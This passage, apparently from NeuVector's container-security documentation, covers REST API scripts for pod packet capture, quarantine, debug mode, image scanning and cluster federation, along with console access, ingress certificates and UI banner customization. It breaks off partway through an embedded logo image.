&gt;&amp;2 &quot;Required curl but it's not installed. Aborting.&quot;; exit 1; } hash jq 2&gt;/dev/null || { echo &gt;&amp;2 &quot;Required jq but it's not installed. Aborting.&quot;; exit 1;} script=&quot;$0&quot; usage() { echo &quot;Usage: $script -n [namespace] -d [pcap duration (seconds)] -l [https://nvserver:10443]&quot; 1&gt;&amp;2; exit 1; } while getopts &quot;:n:d:l:h&quot; opt; do case $opt in n) NAMESPACE=$OPTARG ;; d) DURATION=$OPTARG ;; l) URL=&quot;$OPTARG/v1&quot; ;; h) usage ;; \\?) echo &quot;Invalid option, $OPTARG. Try -h for help.&quot; 1&gt;&amp;2 ;; :) echo &quot;Invalid option: $OPTARG requires an argument&quot; 1&gt;&amp;2 esac done if [ ! &quot;$NAMESPACE&quot; ] || [ ! &quot;$DURATION&quot; ] || [ ! &quot;$URL&quot; ] then usage exit 1 fi count=0 for i in `kubectl -n $NAMESPACE get pods -o wide 2&gt; /dev/null | tail -n +2 | awk '{print $1}' | sed 's|\\(.*\\)-.*|\\1|' | uniq`; do CHOICE1[count]=$i count=$count+1 done if [ -z ${CHOICE1[0]} ]; then echo &quot;No pods found in $NAMESPACE.&quot; exit 1 else for i in &quot;${!CHOICE1[@]}&quot; do echo &quot;$i : ${CHOICE1[$i]}&quot; done read -p &quot;Packet capture on which pod group? &quot; -r if [ -n $REPLY ]; then POD_STRING=${CHOICE1[$REPLY]} echo $POD_STRING &quot; selected.&quot; else exit 1 fi fi sniffer_start() { URI=&quot;/sniffer?f_workload=$1&quot; sniff_id=$(curl -ks --location --request POST ${URL}${URI} &quot;${curlHeaders[@]}&quot; --data-raw '{ &quot;sniffer&quot;: { &quot;file_number&quot;: 1, &quot;filter&quot;: &quot;&quot; }}' | jq .result.id) echo $sniff_id } sniffer_stop() { URI=&quot;/sniffer/stop/${1}&quot; status_code=`curl -ks -w &quot;%{http_code}&quot; --location --request PATCH ${URL}${URI} &quot;${curlHeaders[@]}&quot;` echo $status_code } sniffer_pcap_get() { URI=&quot;/sniffer/${1}/pcap&quot; status_code=`curl -ks -w &quot;%{http_code}&quot; --location --request GET ${URL}${URI} &quot;${curlHeaders[@]}&quot; -o $1.pcap` echo $status_code } sniffer_pcap_delete() { URI=&quot;/sniffer/${1}&quot; status_code=`curl -ks -w &quot;%{http_code}&quot; --location --request DELETE ${URL}${URI} &quot;${curlHeaders[@]}&quot;` echo $status_code } show_menu() { count=0 for i in &quot;Exit script&quot; &quot;Start packet capture for $DURATION seconds&quot; &quot;Download packet capture from pods&quot; &quot;Delete packet capture from pods&quot;; do CHOICE2[count]=$i count=$count+1 done echo echo &quot;Selections:&quot; for i in &quot;${!CHOICE2[@]}&quot; do echo &quot;$i : ${CHOICE2[$i]}&quot; done } get_token() { read -p &quot;Enter NeuVector Username: &quot; USER if [ -z $USER ]; then echo &quot;Blank username, exiting...&quot; exit 1 fi read -s -p &quot;Enter password: &quot; PASS if [ -z $PASS ]; then echo echo &quot;Blank password, exiting...&quot; exit 1 fi TOKEN=`curl -ks --location --request POST ${URL}/auth \\ --header &quot;accept: application/json&quot; \\ --header &quot;Content-Type: application/json&quot; \\ --data-raw '{&quot;password&quot;: {&quot;username&quot;: &quot;'$USER'&quot;, &quot;password&quot;: &quot;'$PASS'&quot;}}'|jq .token.token` echo $TOKEN } TOKEN=$(get_token) while [ &quot;$TOKEN&quot; = &quot;null&quot; ]; do echo echo &quot;Authenticating failed, retry.&quot; TOKEN=$(get_token) done TOKEN=${TOKEN:1:${#TOKEN}-2} echo declare -a curlHeaders=('-H' &quot;Content-Type: application/json&quot; '-H' &quot;X-Auth-Token: $TOKEN&quot;) echo &quot;Pulling worklods from $URL&quot; declare -a workloads=&quot;($( curl -ks --location --request GET ${URL}/workload &quot;${curlHeaders[@]}&quot; \\ | jq '.workloads[] | select(.display_name | startswith(&quot;'${POD_STRING}'&quot;))| select(.domain==&quot;'$NAMESPACE'&quot; and .cap_sniff==true) | .display_name + &quot;::&quot; +.id' -r ))&quot; if [ ${#workloads[@]} -eq 0 ]; then echo echo &quot;No pods is capable of packet capture. Only ethernet IP part of Kubernetes CIDR can packet capture.&quot; exit 1 else echo echo &quot;List of Pods to perform capture on.&quot; echo &quot;Pod Name : ID&quot; for pods in &quot;${workloads[@]}&quot; ; do POD_NAME=&quot;${pods%%::*}&quot; POD_ID=&quot;${pods##*::}&quot; echo &quot;$POD_NAME : $POD_ID&quot; done fi while :; do show_menu read -p &quot;Choice? &quot; -r if [ -n $REPLY ]; then case &quot;$REPLY&quot; in 0) exit 0; ;; 1) counter=0 declare -a sniffs; for pods in &quot;${workloads[@]}&quot;; do POD_ID=&quot;${pods##*::}&quot; sniff_id=&quot;$(sniffer_start $POD_ID)&quot;; sniffs[$counter]=$sniff_id counter=$((counter+1)) done echo &quot;Running pcap for ~$DURATION seconds.&quot;; sleep $DURATION; for sniff_id in &quot;${sniffs[@]}&quot;; do sniff_id=${sniff_id:1:${#sniff_id}-2} status=&quot;$(sniffer_stop $sniff_id)&quot;; done ;; 2) for sniff_id in &quot;${sniffs[@]}&quot;; do sniff_id=${sniff_id:1:${#sniff_id}-2} status=&quot;$(sniffer_pcap_get $sniff_id)&quot;; done ;; 3) for sniff_id in &quot;${sniffs[@]}&quot;; do sniff_id=${sniff_id:1:${#sniff_id}-2} status=&quot;$(sniffer_pcap_delete $sniff_id)&quot;; done ;; esac else exit 1 fi done   Enable Disable Container Quarantine​  The API call to quarantine is via PATCH to /v1/workload/:id with the following body. The workload id is the container/pod id.  --data-raw '{ &quot;config&quot;: { &quot;quarantine&quot;: true, &quot;wire&quot;: &quot;default&quot;, &quot;quarantine_reason&quot;: &quot;violation&quot; } }'   Enable Debugging Mode for NeuVector Support​  Set access token with your IP, user, password:  _controllerIP_=&quot;&lt;your_controller_ip&gt;&quot; _controllerRESTAPIPort_=&quot;10443&quot; _neuvectorUsername_=&quot;admin&quot; _neuvectorPassword_=&quot;admin&quot;   Get the authentication token  curl -k -H &quot;Content-Type: application/json&quot; -d '{&quot;password&quot;: {&quot;username&quot;: &quot;'$_neuvectorUsername_'&quot;, &quot;password&quot;: &quot;'$_neuvectorPassword_'&quot;}}' &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/auth&quot; &gt; /dev/null 2&gt;&amp;1 &gt; token.json _TOKEN_=`cat token.json | jq -r '.token.token'`   Enable Debug Mode  curl -X PATCH -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;config&quot;: {&quot;controller_debug&quot;: [&quot;cpath&quot;, &quot;conn&quot;]}}' &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/system/config&quot; &gt; /dev/null 2&gt;&amp;1 &gt; set_debug.json #debug options - cpath, conn, mutex, scan, cluster , all   Disable Debug on all controllers in a cluster  curl -X PATCH -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;config&quot;: {&quot;controller_debug&quot;: []}}' &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/system/config&quot; &gt; /dev/null 2&gt;&amp;1 &gt; set_debug.json   Check the controller debug status in a cluster  curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/system/config&quot; &gt; /dev/null 2&gt;&amp;1 &gt; system_setting.json cat system_setting.json | jq .config.controller_debug   Logout  echo `date +%Y%m%d_%H%M%S` log out curl -k -X 'DELETE' -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/auth&quot; &gt; /dev/null 2&gt;&amp;1   Report if a vulnerability is in the base image layers​  To identify CVE's in the base image when using REST API to scan images, the base image must be identified in the API call, as in the example below.  curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;request&quot;: {&quot;registry&quot;: &quot;https://registry.hub.docker.com/&quot;, &quot;repository&quot;: &quot;garricktam/debian&quot;, &quot;tag&quot;: &quot;latest&quot;, &quot;scan_layers&quot;: false, &quot;base_image&quot;: &quot;2244...../nodejs:3.2......&quot;}}' &quot;https://$RESTURL/v1/scan/repository&quot; {noformat}   Limitations: If the image to be scanned is a remote image, with &quot;registry&quot; specified, the base image must also be a remote image, and the name must start with http or https. If the image to be scanned is a local image, then the base image must also be a local image as well.  For example,  {&quot;request&quot;: {&quot;repository&quot;: &quot;neuvector/manager&quot;, &quot;tag&quot;: &quot;4.0.2&quot;, &quot;scan_layers&quot;: true, &quot;base_image&quot;: &quot;alpine:3.12.0&quot;}} {&quot;request&quot;: {&quot;registry&quot;: &quot;https://10.1.127.12:5000/&quot;, &quot;repository&quot;: &quot;neuvector/manager&quot;, &quot;tag&quot;: &quot;4.0.0&quot;, &quot;scan_layers&quot;: true, &quot;base_image&quot;: &quot;https://registry.hub.docker.com/alpine:3.12.0&quot;}} {&quot;request&quot;: {&quot;repository&quot;: &quot;neuvector/manager&quot;, &quot;tag&quot;: &quot;4.0.2&quot;, &quot;scan_layers&quot;: true, &quot;base_image&quot;: &quot;10.1.127.12:5000/neuvector/manager:4.0.2”}}   Get the CVE Database Version and Date​  curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; &quot;https://127.0.0.1:10443/v1/scan/scanner&quot;   Output:  { &quot;scanners&quot;: [ { &quot;cvedb_create_time&quot;: &quot;2020-07-07T10:34:04Z&quot;, &quot;cvedb_version&quot;: &quot;1.950&quot;, &quot;id&quot;: &quot;0f043705948557828ac1831ee596588a0d050950113117ddd19ecd604982f4d9&quot;, &quot;port&quot;: 18402, &quot;server&quot;: &quot;127.0.0.1&quot; }, { &quot;cvedb_create_time&quot;: &quot;2020-07-07T10:34:04Z&quot;, &quot;cvedb_version&quot;: &quot;1.950&quot;, &quot;id&quot;: &quot;9fa02c644d603f59331c95735158d137002d32a75ed1014326f5039f38d4d717&quot;, &quot;port&quot;: 18402, &quot;server&quot;: &quot;192.168.9.95&quot; } ] }   Manage Federation for Master and Remote (Worker) Clusters​  Generally, listing Federation members can use a GET to the following endpoint (see samples for specific syntax):https://neuvector-svc-controller.neuvector:10443/v1/fed/member  Selected Federation Management API's:  _masterClusterIP_=$1 _workerClusterIP_=$2 # this is used if one of clusters is going to be kicked by master cluster _CLUSTER_name_=$3 echo `date +%Y%m%d_%H%M%S` [$_curCase_] login as default admin user curl -k -H &quot;Content-Type: application/json&quot; -d '{&quot;password&quot;: {&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;admin&quot;}}' &quot;https://$_masterClusterIP_:10443/v1/auth&quot; &gt; /dev/null 2&gt;&amp;1 &gt; ./$_LOGFOLDER_/token.json _TOKEN_M_=`cat ./$_LOGFOLDER_/token.json | jq -r '.token.token'` echo `date +%Y%m%d_%H%M%S` [$_curCase_] promote to master cluster curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_M_&quot; -d '{&quot;master_rest_info&quot;: {&quot;port&quot;: 11443, &quot;server&quot;: &quot;'$_masterClusterIP_'&quot;}, &quot;name&quot;: &quot;master&quot;}' &quot;https://$_masterClusterIP_:10443/v1/fed/promote&quot; &gt; /dev/null 2&gt;&amp;1 echo `date +%Y%m%d_%H%M%S` [$_curCase_] idle 6 seconds for logon session timeout sleep 6 echo `date +%Y%m%d_%H%M%S` [$_curCase_] login as default admin user on master cluster curl -k -H &quot;Content-Type: application/json&quot; -d '{&quot;password&quot;: {&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;admin&quot;}}' &quot;https://$_masterClusterIP_:10443/v1/auth&quot; &gt; /dev/null 2&gt;&amp;1 &gt; ./token.json _TOKEN_M_=`cat ./token.json | jq -r '.token.token'` echo `date +%Y%m%d_%H%M%S` [$_curCase_] checking fed join_token on master cluster curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_M_&quot; &quot;https://$_masterClusterIP_:10443/v1/fed/join_token&quot; &gt; /dev/null 2&gt;&amp;1 &gt; ./join_token.json cat ./join_token.json | jq -c . _JOIN_TOKEN_=`cat ./join_token.json | jq -r '.join_token'` echo `date +%Y%m%d_%H%M%S` [$_curCase_] login as default admin user on worker cluster curl -k -H &quot;Content-Type: application/json&quot; -d '{&quot;password&quot;: {&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;admin&quot;}}' &quot;https://$_workerClusterIP_:10443/v1/auth&quot; &gt; /dev/null 2&gt;&amp;1 &gt; ./token.json _TOKEN_W_=`cat ./token.json | jq -r '.token.token'` echo `date +%Y%m%d_%H%M%S` [$_curCase_] joining the cluster curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_W_&quot; -d '{&quot;join_token&quot;: &quot;'$_JOIN_TOKEN_'&quot;, &quot;name&quot;: &quot;worker&quot;, &quot;joint_rest_info&quot;: {&quot;port&quot;: 10443, &quot;server&quot;: &quot;'$_workerClusterIP_'&quot;}}' &quot;https://$_workerClusterIP_:10443/v1/fed/join&quot; &gt; /dev/null 2&gt;&amp;1 echo `date +%Y%m%d_%H%M%S` [$_curCase_] idle 9 seconds for events sleep 9 ########## whenever there is a change on cluster such as a cluster is kicked/left/joined, run this to check the status ############ echo `date +%Y%m%d_%H%M%S` [$_curCase_] checking fed member on master cluster curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_M_&quot; &quot;https://$_masterClusterIP_:10443/v1/fed/member&quot; &gt; /dev/null 2&gt;&amp;1 &gt; ./fedMember.json cat ./fedMember.json | jq -c . echo `date +%Y%m%d_%H%M%S` [$_curCase_] checking fed member on worker cluster curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_W_&quot; &quot;https://$_workerClusterIP_:10443/v1/fed/member&quot; &gt; /dev/null 2&gt;&amp;1 &gt; ./fedMember.json cat ./fedMember.json | jq -c . _CLUSTER_id_=`cat ./fedMember.json | jq -r --arg _CLUSTER_name_ &quot;$_CLUSTER_name_&quot; '.joint_clusters[] | select(.name == $_CLUSTER_name_).id'` ################################################################################################################################### ########## for ur information to leave or kick the cluster ############ echo `date +%Y%m%d_%H%M%S` [$_curCase_] requesting to leave on worker cluster curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_W_&quot; -d '{&quot;force&quot;: false}' &quot;https://$_workerClusterIP_:10443/v1/fed/leave&quot; &gt; /dev/null 2&gt;&amp;1 echo `date +%Y%m%d_%H%M%S` [$_curCase_] idle 9 seconds for events sleep 9 echo `date +%Y%m%d_%H%M%S` [$_curCase_] requesting to kick on master cluster, $_CLUSTER_id_ curl -k -X &quot;DELETE&quot; -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_M_&quot; &quot;https://$_masterClusterIP_:10443/v1/fed/cluster/$_CLUSTER_id_&quot; &gt; /dev/null 2&gt;&amp;1 echo `date +%Y%m%d_%H%M%S` [$_curCase_] idle 9 seconds for events sleep 9 #######################################################################  ","version":"Next 🚧","tagName":"h3"},{"title":"Connect to Manager, REST API server","type":0,"sectionRef":"#","url":"/next/configuration/console","content":"","keywords":"","version":"Next 🚧"},{"title":"Connect to UI​","type":1,"pageTitle":"Connect to Manager, REST API server","url":"/next/configuration/console#connect-to-ui","content":" Open a browser window, connect to the manager using HTTPS. After accepting the EULA, the user is able to access the UI.  tip Depending of the deployment method you chose, the manager address will be as follow DockerKubernetes without LoadBalancer or IngressLoadBalancer or Ingress configured https://&lt;manager_host_ip&gt;:8443     You can manage NeuVector from the Console or by using the REST API.  note See below for cases where your corporate firewall blocks 8443.  note If your Chrome browser blocks the NeuVector self-signed certificate, see the next section on Chrome Certificate Upload.  ","version":"Next 🚧","tagName":"h3"},{"title":"Connect to REST API Server​","type":1,"pageTitle":"Connect to Manager, REST API server","url":"/next/configuration/console#connect-to-rest-api-server","content":" All operations in NeuVector can be invoked through the REST API instead of the console. The REST API server is part of the Controller/Allinone container. For details on the REST API, please see the section on Workflow and Automation.  ","version":"Next 🚧","tagName":"h3"},{"title":"Default username and password​","type":1,"pageTitle":"Connect to Manager, REST API server","url":"/next/configuration/console#default-username-and-password","content":" admin:admin  After successful login, the admin user should update the account with a more secure password.  ","version":"Next 🚧","tagName":"h3"},{"title":"Creating Additional Users​","type":1,"pageTitle":"Connect to Manager, REST API server","url":"/next/configuration/console#creating-additional-users","content":" New users can be added from the Settings -&gt; Users &amp; Roles menu. There are predefined global roles in NeuVector:  Admin. Able to perform all actions except Federated policies.Federated Admin. Able to perform all actions, including setting up Master/Remote clusters and Federated policies (rules). Only visible if Multi-cluster is enabled.View Only (reader). No actions allowed, just viewing.CI Integration (ciops). Able to perform CI/CD scanning integration tasks such as image scanning. This user role is recommended for use in build-phase scanning plug-ins such as Jenkins, Bamboo etc and for use in the REST API calls. It is limited to scanning functions and will not be able to do any actions in the console.  Users can be restricted to one or more namespaces using the Advanced Settings.  See the section Users &amp; Roles for advanced user management and creation of custom roles.  ","version":"Next 🚧","tagName":"h3"},{"title":"Connection Timeout Setting​","type":1,"pageTitle":"Connect to Manager, REST API server","url":"/next/configuration/console#connection-timeout-setting","content":" You can set the number of seconds which the console will timeout in the upper right of the console in My Profile -&gt; Session timeout. The default is 5 minutes and the maximum is 3600 seconds (1 hour).  ","version":"Next 🚧","tagName":"h3"},{"title":"Enabling HTTP for Manager​","type":1,"pageTitle":"Connect to Manager, REST API server","url":"/next/configuration/console#enabling-http-for-manager","content":" To disable HTTPS and enable HTTP access, add this to the Manager or Allinone yaml section in the environment variables section. For example, in Kubernetes:  - name: MANAGER_SSL value: “off”   For OpenShift, also remove this setting from the Route section of the yaml:  tls: termination: passthrough   This is useful if putting the manager behind a load balancer.  ","version":"Next 🚧","tagName":"h3"},{"title":"Enabling Access from Corporate Network Which Blocks 8443​","type":1,"pageTitle":"Connect to Manager, REST API server","url":"/next/configuration/console#enabling-access-from-corporate-network-which-blocks-8443","content":" If your corporate network does not allow access on port 8443 to the Manager console, you can create an ingress service to map it and allow access.  note The NeuVector UI console is running as non-root user in the container, so it cannot listen on a port less than 1024. This is why it can't be changed to 443.  If you are trying to access the console from your corporate network. Here is the way to use the ClusterIP service and ingress HTTPS redirect to achieve that.  First, create a certificate for HTTPS termination. Here is an example,  openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout tls.key -out tls.crt -subj &quot;/CN=mycloud.domain.com&quot; kubectl create secret tls neuvector-ingress-tls -n neuvector --key=&quot;tls.key&quot; --cert=&quot;tls.crt&quot;   Then, use the following yaml file to expose the 443 port that redirects the HTTPS connection to the manager.  apiVersion: v1 kind: Service metadata: name: neuvector-cluster-webui namespace: neuvector spec: ports: - port: 443 targetPort: 8443 protocol: TCP type: ClusterIP selector: app: neuvector-manager-pod --- apiVersion: extensions/v1beta1 kind: Ingress metadata: name: neuvector-ingress-webui namespace: neuvector annotations: ingress.mycloud.net/ssl-services: ssl-service=neuvector-cluster-webui spec: tls: - hosts: - cloud.neuvector.com secretName: neuvector-ingress-tls rules: - host: cloud.neuvector.com http: paths: - path: backend: serviceName: neuvector-cluster-webui servicePort: 443   You will need to change the annotation for the ingress address from ingress.mycloud.net to your appropriate address.  This example uses the URL cloud.neuvector.com. After the ingress service is created, you can find it's external IP. You then can configure the hosts file to point cloud.neuvector.com to that IP. After that, you should be able to browse to https://cloud.neuvector.com (the url you choose to use).  Using SSL Passthrough Instead of Redirect​  To use TLS/SSL passthrough instead of the redirect example above (supported on some ingress controllers such as nginx), make sure the ingress controller is configured appropriated for passthrough, and the appropriate annotation is added to the ingress. For example,   annotations: ingress.kubernetes.io/ssl-passthrough: &quot;true&quot;   ","version":"Next 🚧","tagName":"h3"},{"title":"Replacing the NeuVector Self-signed Certificates​","type":1,"pageTitle":"Connect to Manager, REST API server","url":"/next/configuration/console#replacing-the-neuvector-self-signed-certificates","content":" Please see the next section Replacing the Self-Signed Certificates for details. The certificate must be replaced in both the Manager and Controller/Allinone yamls.  ","version":"Next 🚧","tagName":"h3"},{"title":"Configuring AWS ALB with Certificate ARN​","type":1,"pageTitle":"Connect to Manager, REST API server","url":"/next/configuration/console#configuring-aws-alb-with-certificate-arn","content":" Here is a sample ingress configuration using the AWS load balancer with the certificate ARN (actual ARN obfuscated).  apiVersion: extensions/v1beta1 kind: Ingress metadata: annotations: # https://kubernetes-sigs.github.io/aws-alb-ingress-controller/guide/ingress/annotation/#healthcheck-path alb.ingress.kubernetes.io/backend-protocol: HTTPS alb.ingress.kubernetes.io/certificate-arn: arn:aws:acm:us-west-2:596810101010:certificate/380b6abc-1234-408d-axyz-651710101010 alb.ingress.kubernetes.io/healthcheck-path: / alb.ingress.kubernetes.io/healthcheck-protocol: HTTPS alb.ingress.kubernetes.io/listen-ports: '[{&quot;HTTPS&quot;:443}]' alb.ingress.kubernetes.io/scheme: internet-facing alb.ingress.kubernetes.io/success-codes: &quot;301&quot; alb.ingress.kubernetes.io/target-type: instance external-dns.alpha.kubernetes.io/hostname: eks.neuvector.com kubernetes.io/ingress.class: alb labels: app: neuvector-webui-ingress name: neuvector-webui-ingress namespace: neuvector spec: tls: - hosts: - eks.neuvector.com rules: - http: paths: - backend: serviceName: neuvector-service-webui servicePort: 8443 path: /*  ","version":"Next 🚧","tagName":"h3"},{"title":"Custom Login, Header and Footer","type":0,"sectionRef":"#","url":"/next/configuration/customui","content":"","keywords":"","version":"Next 🚧"},{"title":"Customizing the Console (UI) Component​","type":1,"pageTitle":"Custom Login, Header and Footer","url":"/next/configuration/customui#customizing-the-console-ui-component","content":" This guide will help you customize the console with the following options:  1. Customize the Login Logo​  To customize the login logo, follow these steps:  Create a 300x80 pixels SVG file.Base64 encode the SVG file.Save the encoded file to the environment variable CUSTOM_LOGIN_LOGO.  2. Customize the Acceptance Policy (e.g. Terms of Use)​  To customize the policy, follow these steps:  The policy content can be plain HTML or text.Base64 encode the policy content.Save the encoded content to the environment variable CUSTOM_EULA_POLICY.  3. Customize the Page Banner (Shown on every page)​  To customize the page banner, follow these steps:  Header Customization​  Customize the header's content and color.The color of the header banner is required.The color value can be a color keyword (e.g., yellow) or a Hex value (e.g., #ffff00).The content is optional and can be one line of plain HTML or text with a maximum of 120 characters.Base64 encode the header content.Save the encoded content to the environment variables CUSTOM_PAGE_HEADER_COLOR and CUSTOM_PAGE_HEADER_CONTENT.  Footer Customization​  Customize the footer's content and color.The color of the footer banner will be the same as the header banner if the color is not customized.The content is optional and can be one line of plain HTML or text with a maximum of 120 characters.Base64 encode the footer content.Save the encoded content to the environment variables CUSTOM_PAGE_FOOTER_COLOR and CUSTOM_PAGE_FOOTER_CONTENT.  The environment variables (CUSTOM_LOGIN_LOGO, CUSTOM_EULA_POLICY, CUSTOM_PAGE_HEADER_COLOR, CUSTOM_PAGE_HEADER_CONTENT, CUSTOM_PAGE_FOOTER_COLOR, CUSTOM_PAGE_FOOTER_CONTENT) can be defined in the values.yaml file in the helm chart. The corresponding section in the values.yaml file where these variables can be defined is &quot;manager.env.envs&quot;  4. Example to customize the UI pages using helm chart​  Prerequisites​  Before customizing the UI component, ensure that you have the following:  NeuVector Helm chart repository: https://github.com/neuvector/neuvector-helmNeuVector installed on your Kubernetes cluster  Steps​  Follow these steps to customize the UI component:  Locate the NeuVector Helm chart repository in your local environment: https://github.com/neuvector/neuvector-helm.Navigate to the neuvector-helm/charts/core directory.Edit the manager.env.envs in the values.yaml to add the environment variables. CUSTOM_PAGE_HEADER_COLOR: Set the banner color to DarkOrange (#ff8c00).CUSTOM_PAGE_HEADER_CONTENT: Specify the header text using a plain HTML or text, for example &quot;You are accessing a U.S. Government (USG) Information System (IS) that is provided for USG-authorized use only.&quot;, remember to based64 encode it.CUSTOM_EULA_POLICY: Customize the policy content using a plain HTML snippet or text and remember to base64 encode it.CUSTOM_LOGIN_LOGO: Customize the logo with a 300x80 pixel svg file and base64 encode it  manager: # If false, manager will not be installed enabled: true image: repository: nvpublic/ma hash: priorityClassName: env: ssl: true envs: - name: CUSTOM_PAGE_HEADER_COLOR value: &quot;#ff8c00&quot; - name: CUSTOM_PAGE_HEADER_CONTENT value: WW91IGFyZSBhY2Nlc3NpbmcgYSAmbmJzcDs8Yj4gVS5TLiBHb3Zlcm5tZW50IChVU0cpIEluZm9ybWF0aW9uIFN5c3RlbSAoSVMpIDwvYj4gICAgICB0aGF0IGlzIHByb3ZpZGVkIGZvciBVU0ctYXV0aG9yaXplZCB1c2Ugb25seS4= - name: CUSTOM_EULA_POLICY value: PGg0PgogIFlvdSBhcmUgYWNjZXNzaW5nIGEgVS5TLiBHb3Zlcm5tZW50IChVU0cpIEluZm9ybWF0aW9uIFN5c3RlbSAoSVMpIHRoYXQgaXMgcHJvdmlkZWQgZm9yIFVTRy1hdXRob3JpemVkIHVzZSBvbmx5LgpCeSB1c2luZyB0aGlzIElTICh3aGljaCBpbmNsdWRlcyBhbnkgZGV2aWNlIGF0dGFjaGVkIHRvIHRoaXMgSVMpLCB5b3UgY29uc2VudCB0byB0aGUgZm9sbG93aW5nIGNvbmRpdGlvbnM6CjwvaDQ+CjxwPgotVGhlIFVTRyByb3V0aW5lbHkgaW50ZXJjZXB0cyBhbmQgbW9uaXRvcnMgY29tbXVuaWNhdGlvbnMgb24gdGhpcyBJUyBmb3IgcHVycG9zZXMgaW5jbHVkaW5nLCBidXQgbm90IGxpbWl0ZWQgdG8sIHBlbmV0cmF0aW9uIHRlc3RpbmcsIENPTVNFQyBtb25pdG9yaW5nLCBuZXR3b3JrIG9wZXJhdGlvbnMgYW5kIGRlZmVuc2UsIHBlcnNvbm5lbCBtaXNjb25kdWN0IChQTSksIGxhdyBlbmZvcmNlbWVudCAoTEUpLCBhbmQgY291bnRlcmludGVsbGlnZW5jZSAoQ0kpIGludmVzdGlnYXRpb25zLgo8L3A+CjxwPgotQXQgYW55IHRpbWUsIHRoZSBVU0cgbWF5IGluc3BlY3QgYW5kIHNlaXplIGRhdGEgc3RvcmVkIG9uIHRoaXMgSVMuCjwvcD4K - name: CUSTOM_LOGIN_LOGO value: <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" height="80" xml:space="preserve" version="1.1" viewBox="0 0 300 80">
    <image width="300" height="80" xlink:href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAABQCAYAAACj6kh7AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAALiMAAC4jAXilP3YAABMkSURBVHhe7Z0JcBTXmcfFYSfYsUHCIMB4cWXJRW0lu0gCcRhhc5rTXMYGZkZISGAkIQTmCoThxiAw0QkCoYNb4hICZ2s369i1m10nXnsrjrNxtrx2srWprdiO46zXju0Y6P1/T9+Me960Rj2jkaal+X5V/5p5733vzesevb/6TXe/ThAEQRAEQRAEQRAEQRAEQRAEQRAEQRAEQRAEQRAEQRAEQRAEQRAEQRAEQRACmbuu5oEFG07vmL/h1M2Fm84YpEWbzhxbsPG0h0MEQRBiw2Mb6mc99vSpC/M2nDLmbzhtzN942oA5KZkMy1i0+azxOGmL0gsLt5wu4SYEQRA6hjlrayvnrK//6dz19QaMSmkeKQzDWkz67jnjCb/Ovr1489kG/ghBEITw8Xq9PWcU1b41q6jug9nr6ow56+qVyKyiaVhPbiWdN5Zsa9HSbef++OS2C29yNwRBEIKZW1jbb8aampsz19YapFmkojpjNqlTDQv63gVjGcu1Xb1+kltVdQd3VRCEeOKRlXX3zyisnjB9TY3xKGtGYY0xs7DFrJxmWK7tDYbb2yKPt9Hw7GgwXPuufH2p9wf38iYJgtA9MHpMW3X8oSn51TXT8quNafknjekFrC5rWI1GJmlno7F850Vj+a6LRvaei4uydl8axhstCEKXwDB6TMo74Zm86vjvp6w+YUzJq1aaqsyq+xpWFit796UW7by4Jnv3xYm8VwRBcAKT86qHPLzq+E7o40lPHTcmPXXCmAyjIsWzYa0g7SFdNnL2ki7V5+y+upJ3myAIncGEFUfnTcytqp24ssp4mLTquPEISZmVGFZrhpWrdMVYua9FufuuvLRy/5VneLfGjP79+7+bmJg4g5N26I06N/m9Jffccw9C+v/jfffdZ+D1TegE3j9PaegmVMGhghBdxmUfrZqQc+wVyMjIbRGZlRhW+wwLZmWs2n9V6alnoP1X/3P1M03P827vNGAm7/fr128mJ+3Qm4yH3weB9v4J5b/F254tOcGgfBa3IWdehfYxNrv8Z+OyKv84fsVR4yFSzlGDzMrphgV9On/D2a8tLGrow5vio8f89WeGLdh4pt7JhrWadKDJyGOtPnD1I7y+Ttej8XZ0CNE2LJTd5rchGTRo0IBQ7QhCEFOWFd+dnll+a2xWpUEal92i8dlHDccb1rr6D+kMJG+Kn9GuivlprlI1aEYtK30k1V3SqAo0ntxyNsPJhpV3sMnIP3jNyC++ZhRAa4qbjYKDzTcbG41evAlRIZqGhbaGQH/iZJtQO0lJSemcFIQvSPOUDxrjKps1OrPcgEkZ6csrjDEsxxtWUe17c4rq/oE3xc/fLCkflrqsZH+au8wIkMmwLMreGu058mCCduSyeOv5B5ZsO/f20m3nbjrVsNYcalEh6fB1Yy1e15fcSCkoifx6sA44wpKjJiEyvuM+fD8N0lEeUrkxmtQFDGtGYe2rM9bWVPJm+ElxlY9PdZX8OMiEdIUyLE1o78MUT9nEsVkH7lEfwizyNt4Jw3ph2ffOv+tYwyI9e90oIh25YayDuPu26QDDmknlaFcu6RDsk+L+fhG9YvB+5mzDOmk8WniyEa/LVccZ+u0mxV3qTnOXvm5lNCEVhmFZCSaWlbq88quqIyaWbrtQ5vE2/ItzDat5HXfVNtE2LB+